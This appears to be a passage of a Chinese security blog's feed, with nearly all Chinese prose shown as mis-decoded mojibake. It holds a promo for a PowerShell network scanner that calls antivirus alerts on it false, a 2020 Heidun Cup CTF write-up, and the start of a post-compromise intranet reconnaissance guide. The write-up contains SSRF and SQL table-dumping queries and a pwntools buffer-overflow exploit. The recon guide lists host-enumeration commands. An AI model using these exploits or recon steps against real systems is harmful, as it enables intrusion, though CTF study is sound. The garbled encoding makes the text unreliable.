        <content type="html"><![CDATA[<blockquote><p>ç‚¹ç‚¹æŒ‰é’®å°±èƒ½å®Œæˆæ‰«æï¼Œä¸Šæ‰‹åŠå…¶å®¹æ˜“<br>å‰è¨€:â€œæ”¯æŒå¤–ç½‘IPç«¯å£æ¢æµ‹ï¼Œå±€åŸŸç½‘IPç«¯å£æ¢æµ‹ï¼Œå…±äº«èµ„æºæ¢æµ‹ï¼Œå’Œå¤©æ°”æŸ¥è¯¢åŠŸèƒ½ï¼Œè¿ˆå…¥é»‘å®¢ç¬¬ä¸€æ­¥ï¼Œè®©ä½ è½»æ¾ä¸Šè·¯ï¼â€<br>å°±è¿™å°ç©æ„è¿˜æŒºåˆ«è‡´çš„å—·ï¼</p></blockquote><h1 id="å®æµ‹ï¼š"><a href="#å®æµ‹ï¼š" class="headerlink" title="å®æµ‹ï¼š"></a>å®æµ‹ï¼š</h1><h2 id="cmdç•Œé¢"><a href="#cmdç•Œé¢" class="headerlink" title="cmdç•Œé¢"></a>cmdç•Œé¢</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84398683.png"></p><h2 id="Powershell-guiç•Œé¢"><a href="#Powershell-guiç•Œé¢" class="headerlink" title="Powershell-guiç•Œé¢"></a>Powershell-guiç•Œé¢</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1128107352.jpg"></p><h2 id="æŸ¥è¯¢ipç­‰ä¿¡æ¯"><a href="#æŸ¥è¯¢ipç­‰ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢ipç­‰ä¿¡æ¯"></a>æŸ¥è¯¢ipç­‰ä¿¡æ¯</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/365255538.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/409772878.jpg"></p><h2 id="æŸ¥è¯¢å½“åœ°å¤©æ°”é¢„æŠ¥"><a href="#æŸ¥è¯¢å½“åœ°å¤©æ°”é¢„æŠ¥" class="headerlink" title="æŸ¥è¯¢å½“åœ°å¤©æ°”é¢„æŠ¥"></a>æŸ¥è¯¢å½“åœ°å¤©æ°”é¢„æŠ¥</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3292611605.jpg"></p><h1 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h1><p>win10ä»¥ä¸Šç³»ç»Ÿå¯ä½¿ç”¨ï¼Œwin7è¯·å‡çº§poweeshellåˆ°V5ç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é™„ä¸Šç™¾åº¦äº‘èµ„æºï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1-juOKsi39e7fUAHlBagZxA</span><br><span class="line">æå–ç ï¼šv7ce</span><br><span class="line"></span><br><span class="line">é™„ä¸Špowershellå­¦ä¹ èµ„æ–™ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1sIcjKwr4Sk0Jezn8TTytnw</span><br><span class="line">æå–ç ï¼šs765</span><br></pre></td></tr></table></figure><p>åœ¨æ‰«æipç½‘å¡ä¿¡æ¯çš„æ—¶å€™ï¼Œæ€æ¯’è½¯ä»¶ä¼šæŠ¥æ¯’ï¼Œä½†å…¶å®æ²¡æ¯’ï¼Œå°±ä¸€å †æ‰¹å¤„ç†å‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
            <tag> powershellé€Ÿæ‰« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é»‘ç›¾æ¯ 2020</title>
      <link href="2020/09/13/2020%E9%BB%91%E7%9B%BE%E6%9D%AF/"/>
      <url>2020/09/13/2020%E9%BB%91%E7%9B%BE%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0X1-blue"><a href="#0X1-blue" class="headerlink" title="0X1 blue"></a>0X1 blue</h2><p>ä¸‹è½½ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ä¸€ä¸ªå›¾ç‰‡ï¼Œå¥½å¤§ï¼ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/542416461948.png"></p><p>ç›´æ¥binwalk -eæå–</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5184655523.png"></p><p>æ‰“å¼€zipï¼Œå‘ç°é‡Œé¢ä¸€ä¸ªpacpæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/814556247.png"></p><p>è½½å…¥ï¼Œå‘ç°æ˜¯åœ¨è¿›è¡Œæ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5471224569.png"></p><p>ç›´æ¥æ‹‰åˆ°æœ€ä¸‹é¢çŒœå†…å®¹é‚£é‡Œï¼Œæ‰¾åˆ°substrä½æ•°å˜åŠ¨çš„é‚£ä¸ªç¬é—´ï¼Œç­‰å·åé¢çš„å°±æ˜¯æ­£ç¡®çš„flagçš„asciiäº†</p><h2 id="0X2-encrypt"><a href="#0X2-encrypt" class="headerlink" title="0X2 encrypt"></a>0X2 encrypt</h2><p>Base64ä¸¤æ¬¡å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/589859554.png"></p><h2 id="0X3-Trees"><a href="#0X3-Trees" class="headerlink" title="0X3 Trees"></a>0X3 Trees</h2><p>ç”¨Stegsolveæ‰“å¼€ï¼Œç„¶åè‚‰çœ¼å¼ºè¡Œèƒ½çœ‹å‡ºflagï¼šCMISCCTF{coconut_tree}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5156516574.png"></p><h2 id="0X4-Burps"><a href="#0X4-Burps" class="headerlink" title="0X4 Burps"></a>0X4 Burps</h2><p>crcçˆ†ç ´å¾—åˆ°å¯†ç ï¼šthe_password_here_cipherï¼Œæ‰“å¼€flag.txtå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2155523336.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5594449665.png"></p><h2 id="0X5-Blind"><a href="#0X5-Blind" class="headerlink" title="0X5 Blind"></a>0X5 Blind</h2><p>binwalk+foremostå¾—åˆ°ä¸¤å¼ å›¾ç‰‡ï¼Œå†æ ¹æ®é¢˜ç›®ä¸éš¾æ¨å‡ºæ˜¯ç›²æ°´å°Binldwatermark</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5444126879.png"></p><p>é¢ï¼Œçœ‹ä¸æ¸…ï¼Œç”¨stegsolveæ‰“å¼€çœ‹çœ‹ï¼Œå¾—åˆ°å¯†ç ï¼šQ@CTF@NX</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/514959453.png"></p><p>å¾—åˆ°å›¾ç‰‡ï¼Œæ¥ç€binwalkå‘ç°æœ‰ä¸¤å¼ å›¾ç‰‡ï¼Œæ¥ç€010æå–å‡ºç¬¬äºŒå¼ å›¾ç‰‡ï¼Œæ’å…¥12ä¸ª00å¹¶ä¿®æ”¹ä¸ºpngçš„æ–‡ä»¶å¤´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/747755415.png"></p><p>æœ€åå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8884556652.png"></p><h2 id="0X6-ezAffine"><a href="#0X6-ezAffine" class="headerlink" title="0X6 ezAffine"></a>0X6 ezAffine</h2><p>æ˜ å°„ï¼Œçˆ†ç ´ä¸€ä¸‹æ¨¡æ•°ï¼ˆæ³¨æ„è¿™é‡Œa-zæ˜¯0-25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">a &#x3D; &#39;oelb&#123;6d332l0-22ck-2b1n-a35i-125f3qe125l1&#125;&#39;</span><br><span class="line"></span><br><span class="line">l1 &#x3D; string.ascii_lowercase</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for m in a:</span><br><span class="line">if m in l1:</span><br><span class="line">for i in range(17):</span><br><span class="line">if (i * 146442 + 428428)%17 &#x3D;&#x3D; (ord(m)-97):</span><br><span class="line">flag +&#x3D; chr(i+97)</span><br><span class="line">else:</span><br><span class="line">flag +&#x3D; m</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="0X7-qrcode"><a href="#0X7-qrcode" class="headerlink" title="0X7 qrcode"></a>0X7 qrcode</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5471266889.png"></p><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ï¼Œä¼°è®¡æ˜¯ä¿®å¤ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/23448489.png"></p><p>æ‰‹åŠ¨è¡¥å…¨å…¶ä»–ä¸¤ä¸ªè¯†åˆ«å¿«ï¼Œç„¶åè¯†åˆ«</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44587774556.png"></p><p>æœ€åå¾—å‡ºç»“æœ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/598485965.png"></p><h2 id="0X8-music"><a href="#0X8-music" class="headerlink" title="0X8 music"></a>0X8 music</h2><p>è§£å‹ï¼Œä¸€ä¸ªmusic.wavæ–‡ä»¶ï¼Œæ²¡å¬å‡ºä»€ä¹ˆè«æ–¯æˆ–è€…å…¶ä»–çš„ï¼Œç›´æ¥æŸ¥çœ‹æ³¢å½¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1411025489.png"></p><p>è¯•ç€æ¢æˆ0å’Œ1ï¼Œé«˜é¢‘æ¢0æˆ–è€…1å„è¯•ä¸€æ¬¡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88574569452.png"></p><p>ç”Ÿæˆï¼Œæœ€å</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8846921454.png"></p><p>è§£å‡ºä¸€ä¸ªraræ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88745884.png"></p><p>è§£å‹å¤±è´¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/7745999154.png"></p><p>ä½¿ç”¨ç®¡ç†å‘˜æ‰èƒ½è§£å‹ä¹‹åæ‰“å¼€å‘ç°æ˜¯noooflagï¼Œæ€€ç–‘æœ‰éšå†™ï¼Œå› ä¸ºéœ€è¦ç®¡ç†å‘˜ï¼Œæ‰€ä»¥æ€€ç–‘æ˜¯ntfs</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/98455624115.png"></p><p>å‘ç°ntfséšå†™ï¼Œå¯¼å‡ºï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8514785446.png"></p><p>å¾—åˆ°ä¸€ä¸ªäºŒç»´ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/895818554.png"></p><p>ä¼°è®¡æ˜¯ä¿®æ”¹äº†å®½é«˜</p><p>ç”¨c32æ”¹æˆæ­£æ–¹å½¢ï¼Œå¾—åˆ°äºŒç»´ç ã€‚</p><p>æ‰«æå³å¯å¾—å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5864141444.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0X1-Round"><a href="#0X1-Round" class="headerlink" title="0X1 Round"></a>0X1 Round</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;:D@J::K&#x3D;r&lt;ecXi^[V:XjXit&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">flag +&#x3D; chr(ord(i)+9)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="0X2-Factor"><a href="#0X2-Factor" class="headerlink" title="0X2 Factor"></a>0X2 Factor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n &#x3D; 3454083680130687060405946528826790951695785465926614724373</span><br><span class="line">e &#x3D; 3</span><br><span class="line">c &#x3D; 1347530713288996422676156069761604101177635382955634367208</span><br><span class="line"></span><br><span class="line">p,r,q &#x3D;   11761833764528579549,17100682436035561357,17172929050033177661</span><br><span class="line"></span><br><span class="line">d &#x3D; gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line"></span><br><span class="line">print long_to_bytes(pow(c,d,p*q))</span><br></pre></td></tr></table></figure><h2 id="0X3-Change"><a href="#0X3-Change" class="headerlink" title="0X3 Change"></a>0X3 Change</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">c&#x3D; 182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br><span class="line">n&#x3D; 438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br><span class="line">e &#x3D; 65537 </span><br><span class="line">n1 &#x3D; n&#x2F;&#x2F;(10**600) </span><br><span class="line">n2 &#x3D; (n&#x2F;&#x2F;(10**400))%(10**200) </span><br><span class="line">n3 &#x3D; (n&#x2F;&#x2F;(10**200))%(10**200) </span><br><span class="line">n4 &#x3D; n%(10**200) </span><br><span class="line">AB &#x3D; 0 </span><br><span class="line">if ((n2&#x2F;&#x2F;10**199)&gt;&#x3D;n4&#x2F;&#x2F;(10**199)):</span><br><span class="line">AB&#x3D;n1*(10**200)+n4 </span><br><span class="line">else:</span><br><span class="line">AB &#x3D; (n1-1)*(10**200)+n4 </span><br><span class="line">A2B2 &#x3D; (n-AB*(10**400+1))&#x2F;&#x2F;(10**200)</span><br><span class="line">AaddB &#x3D; int(gmpy2.iroot(A2B2+2*AB,2)[0])</span><br><span class="line">A_B &#x3D; int(gmpy2.iroot((A2B2-2*AB),2)[0])</span><br><span class="line">A &#x3D; (AaddB+A_B)&#x2F;2 </span><br><span class="line">B &#x3D; (AaddB-A_B)&#x2F;2 </span><br><span class="line">p &#x3D; A*(10**200)+B </span><br><span class="line">q &#x3D; B*(10**200)+A </span><br><span class="line">phi &#x3D; (p-1)*(q-1) </span><br><span class="line">d&#x3D;gmpy2.invert(e,phi)</span><br><span class="line">print long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="0X1-simplebrowser"><a href="#0X1-simplebrowser" class="headerlink" title="0X1 simplebrowser"></a>0X1 simplebrowser</h2><p>ï¼ˆå¿˜äº†æˆªå›¾ï¼‰ï¼Œæ‰“å¼€ç‚¹å‡»browserï¼Œçœ‹åˆ°base64æç¤ºï¼Œæç¤ºflagåœ¨æœ¬åœ°mysqlï¼Œç”¨æˆ·åä¸ºadminï¼ŒçŸ¥é“æ˜¯è€ƒå¯Ÿssrfã€‚</p><p>ç›´æ¥ç”¨gopherusï¼Œç”¨æˆ·åè¾“å…¥adminï¼Œç„¶åshow databases;</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84574444999567.png"></p><p>å¾—åˆ°åº“<br>ç„¶åç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) <span class="keyword">from</span> information_schema.columns where table_schema =<span class="string">&#x27;ctfcontest&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name =<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> table_scheam=<span class="string">&#x27;ctfcontest&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55112244987.png"></p><p>æœ€åç›´æ¥select * from ctfcontest.flag</p><p>å¾—åˆ°flag{wqweb_simplebrowser}</p><p>å…¨ç¨‹ä½¿ç”¨</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/213451149.png"></p><h1 id="PWM"><a href="#PWM" class="headerlink" title="PWM"></a>PWM</h1><h2 id="0X1-cmcc-stack"><a href="#0X1-cmcc-stack" class="headerlink" title="0X1 cmcc_stack"></a>0X1 cmcc_stack</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/564447778955.png"></p><p>ç›´æ¥æ‹–è¿›å»f5æŸ¥çœ‹ä»£ç ï¼Œè¦æ±‚v5ç­‰äºé‚£ä¸ªå€¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/884998887.png"></p><p>0xdeadbeef</p><p>ç›´æ¥è¦†ç›–ç”¨ä¸Šé¢çš„readbuffæº¢å‡ºè¦†ç›–æ ˆæ¥ä¿®æ”¹v5çš„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2222456128779.png"></p><p>è®¡ç®—å‡½æ•°åˆ°readçš„åœ°å€å’Œå‡½æ•°åˆ°v5åœ°å€<br>åˆ°readæ˜¯esp+80h+68,v5æ˜¯7cï¼Œ0x80+0x68-0x7c-8ç›¸å‡ç­‰äº64<br>çœ‹ä¸‹checksecæ²¡æœ‰ä¿æŠ¤ç›´æ¥èµ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pl &#x3D; b&#39;A&#39;*0x64 + p32(0xdeadbeef)</span><br><span class="line">p &#x3D; remote(&#39;172.å¤šå°‘æ¥ç€å¿˜äº†&#39;,888)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Recverse"><a href="#Recverse" class="headerlink" title="Recverse"></a>Recverse</h1><h2 id="0X1-crackme"><a href="#0X1-crackme" class="headerlink" title="0X1 crackme"></a>0X1 crackme</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4144466287987.png"></p><p>è¾“å…¥ç”¨æˆ·åå¯†ç é€ä¸ªå­—ç¬¦å¼‚æˆ–ç„¶åä½œä¸ºå‚æ•°ä¼ åˆ°å…³é”®å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44144775692.png"></p><p>ç„¶åv3å’Œv4å¼‚æˆ–ï¼Œåªæœ‰ä¼ å…¥æ­£ç¡®çš„å€¼æ‰èƒ½å¾—åˆ°flagï¼Œçœ‹ç€å°±å¤´ç–¼ã€‚</p><p>æ ¹æ®é¢˜ç›®ï¼Œv4æ˜¯intï¼ŒèŒƒå›´åªæœ‰0-255ï¼Œéå¸¸çš„å°ï¼Œç›´æ¥çˆ†ç ´èµ°èµ·</p><p>æœ€å255ä¸ªè¾“å‡ºä¸­ä¸­ï¼Œæ‰¾åˆ°flag</p><p>CMISCCTF{do_you_burp_and_solve}</p><h2 id="0X2-Check"><a href="#0X2-Check" class="headerlink" title="0X2 Check"></a>0X2 Check</h2><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ªchanl.eæ–‡ä»¶ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯llvm.irï¼Œç›´æ¥è¯»å§<br>ä¸¤ä¸ªé‡ç‚¹å˜é‡dso_localå’ŒMAX_SIZE<br>æ¥ä¸‹æ¥çš„å‡½æ•°å°±æ˜¯è¯»å–ç„¶åå¼‚æˆ–æ“ä½œç­‰ç­‰<br>æ ¹æ®ä»£ç ï¼Œç”¨pythoné‡æ–°å®ç°ä¸€é</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">check &#x3D; &quot;\x1a\x1c\x16\x10\x00\x11\x12\xcb\xf2\x14\x0e\x05\x03\x1d\x19\x0e\x02\x0a\x1f\x07\x0c\x01\x17\x06\x0c\x1d\x14\x0b\x1f\x1d\x17\x07\x0d\x1d\x0e\x0c\x1e\x06\xfc\x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05&quot;</span><br><span class="line">lcheck &#x3D; [ord(i) for i in check]</span><br><span class="line">for i in range(len(lcheck)-1, 0, -1):</span><br><span class="line">lcheck[i-1] &#x3D; lcheck[i-1] ^ lcheck[i]</span><br><span class="line">flag &#x3D; &quot;&quot;.join([chr(i-5) for i in lcheck])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4415662568.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é»‘ç›¾æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€-ä¿¡æ¯æ”¶é›†</title>
      <link href="2020/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šå†…ç½‘æ¸—é€çš„æœ¬è´¨ï¼Œæ˜¯ä¿¡æ¯æ”¶é›†ï¼ï¼Œä¿¡æ¯æ”¶é›†è¿™ä¸€ç¯èŠ‚å…¶å®è´¯ç©¿äº†æ•´ä¸ªå†…ç½‘æ¸—é€ï¼</p></blockquote><h1 id="01-ç«‹è¶³ç‚¹ï¼š"><a href="#01-ç«‹è¶³ç‚¹ï¼š" class="headerlink" title="01-ç«‹è¶³ç‚¹ï¼š"></a>01-ç«‹è¶³ç‚¹ï¼š</h1><p>Footholdï¼Œå°±æ˜¯æˆ‘ä»¬æ‹¿åˆ°å†…ç½‘ä¸­ä¸€å°ä¸»æœºæƒé™ï¼Œä½œä¸ºå†…ç½‘æ¸—é€çš„çªç ´å£ï¼Œæˆ‘ä»¬æ‰€æœ‰çš„æ“ä½œï¼ŒåŒ…æ‹¬æµé‡è½¬å‘ï¼Œç«¯å£æ‰«æï¼Œæ¼æ‰«ç­‰æ“ä½œï¼Œéƒ½ä¼šåˆ©ç”¨æ­¤ä¸»æœºä¸ºæˆ‘ä»¬æ­æ¡¥é“ºè·¯ï¼Œä¸ºä»¥åçš„å†…ç½‘æ¨ªå‘æ‰“ä¸‹åšå®çš„åŸºç¡€ã€‚</p><h1 id="02-ç«‹è¶³ç‚¹çš„ä¿¡æ¯æ”¶é›†"><a href="#02-ç«‹è¶³ç‚¹çš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="02-ç«‹è¶³ç‚¹çš„ä¿¡æ¯æ”¶é›†"></a>02-ç«‹è¶³ç‚¹çš„ä¿¡æ¯æ”¶é›†</h1><h2 id="ç«‹è¶³ç‚¹ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ï¼š"><a href="#ç«‹è¶³ç‚¹ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ï¼š" class="headerlink" title="ç«‹è¶³ç‚¹ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ï¼š"></a>ç«‹è¶³ç‚¹ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ï¼š</h2><p>OSã€æƒé™ã€å†…ç½‘IPæ®µã€æ€è½¯ã€ç«¯å£ã€æœåŠ¡ã€è¡¥ä¸æ›´æ–°é¢‘ç‡ã€ç½‘ç»œè¿æ¥ã€å…±äº«ã€ä¼šè¯ç­‰</p><blockquote><p>æ³¨ï¼šå¦‚æœæ˜¯åŸŸå†…ä¸»æœºï¼ŒOSã€åº”ç”¨è½¯ä»¶ã€è¡¥ä¸ã€æœåŠ¡ã€æ€è½¯è¿™äº›ä¸€èˆ¬éƒ½æ˜¯æ‰¹é‡å®‰è£…çš„ã€‚</p></blockquote><p><strong>å‰æ–¹å¹²è´§æ¥è¢­,æ³¨æ„æ³¨æ„ï¼</strong></p><h5 id="1-æŸ¥è¯¢ç½‘ç»œé…ç½®å‘½ä»¤ï¼š"><a href="#1-æŸ¥è¯¢ç½‘ç»œé…ç½®å‘½ä»¤ï¼š" class="headerlink" title="1.æŸ¥è¯¢ç½‘ç»œé…ç½®å‘½ä»¤ï¼š"></a>1.æŸ¥è¯¢ç½‘ç»œé…ç½®å‘½ä»¤ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">ipconfig &#x2F;all</span><br><span class="line"></span><br><span class="line">Linux:    </span><br><span class="line">ifconfig &#x2F;all</span><br><span class="line">cat &#x2F;etc&#x2F;resolv.conf</span><br><span class="line">cat &#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">cat &#x2F;etc&#x2F;networks</span><br></pre></td></tr></table></figure><h5 id="2-æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶çš„ä¿¡æ¯"><a href="#2-æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶çš„ä¿¡æ¯" class="headerlink" title="2.æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶çš„ä¿¡æ¯"></a>2.æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶çš„ä¿¡æ¯</h5><p>1ï¼‰æŸ¥çœ‹æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 